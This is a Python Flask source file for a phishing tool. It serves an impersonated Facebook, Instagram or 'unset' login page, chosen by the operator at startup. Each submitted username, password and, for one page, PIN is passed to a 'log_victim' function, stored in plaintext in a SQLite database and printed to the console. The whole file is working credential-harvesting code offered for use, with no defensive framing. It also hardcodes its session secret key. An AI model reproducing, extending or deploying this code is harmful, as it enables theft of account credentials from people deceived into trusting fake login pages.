import os, time, logging
from flask import Flask, render_template, request, redirect, url_for, session
from model import db, User, User2
from victims import log_victim

# Set the folders for your HTML templates and static files (like CSS, JS, images).
TEMPLATE_DIR = "./templates"
STATIC_DIR = "./static"

# Create the Flask app object and add all the configurations you wish to.
app = Flask(
    __name__,
    template_folder=TEMPLATE_DIR,
    static_folder=STATIC_DIR,
)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "users.db")
app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{DB_PATH}"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SECRET_KEY"] = (
    "692hdkbckjz9qqykq3t8eq"  # Needed for sessions and flash messages
)

# This starts the model for the database since we didn't start it in our model(module).
db.init_app(app)

# This It registers the routes based on the user's choice.Go to line 103 for better understanding.
def register_routes(app, allowed_platform):
    def handle_platform(platform):
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            pin = request.form.get("pin") if platform == "unset" else None
            log_victim(platform, username, password, pin)
            if platform == "unset":
                new_user2 = User2(username=username, password=password, pin=pin)
                db.session.add(new_user2)
                db.session.commit()
                user2 = (
                    User2.query.filter_by(username=username, password=password, pin=pin)
                    .order_by(User2.id.desc())
                    .first()
                )
                if user2:
                    print(
                        f"[{platform.upper()}] New login: username='{username}', password='{password}', pin='{pin}'"
                    )
                    session["username"] = user2.username
                    return redirect(url_for(platform))
            else:
                new_user = User(username=username, password=password)
                db.session.add(new_user)
                db.session.commit()
                print("debug: User added to the database.")
                user = (
                    User.query.filter_by(username=username, password=password)
                    .order_by(User.id.desc())
                    .first()
                )
                if user:
                    print(
                        f"[{platform.upper()}] New login: username='{username}', password='{password}'"
                    )
                    session["username"] = user.username
                    return redirect(url_for(platform))
        # Render the platform-specific template
        return render_template(f"{platform}.html")
        
    # Register the route in accord with the user's choice.
    app.add_url_rule(
        "/",
        endpoint=allowed_platform,
        view_func=lambda platform=allowed_platform: handle_platform(platform),
        methods=["GET", "POST"],
    )


# This runs when you start the script
if __name__ == "__main__":
    # This creates a context for the app, which is necessary for database operations.
    with app.app_context():
        db.create_all()
    if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
        # Get the user's choice
        routes = {
            "1": ("facebook", "/facebook"),
            "2": ("instagram", "/instagram"),
            "3": ("unset", "/unset"),
        }
        print("\nWelcome! Which page do you want to load?\n")
        for number, (name, _) in routes.items():
            print(f"  {number}. {name.capitalize()}")

        choice = input("Enter the number of your choice (1-3): ").strip()
        if choice in routes:
            allowed_platform, _ = routes[choice]
            print(f"\nYou selected {allowed_platform.capitalize()}.")
        else:
            print("Invalid selection. Exiting.\n")
            exit(1)
        time.sleep(1)
        os.system("clear || cls")
    else:
        # Default to facebook if reloader
        allowed_platform = "facebook"
    register_routes(app, allowed_platform)
    app.run(debug=False)  # Start the Flask server
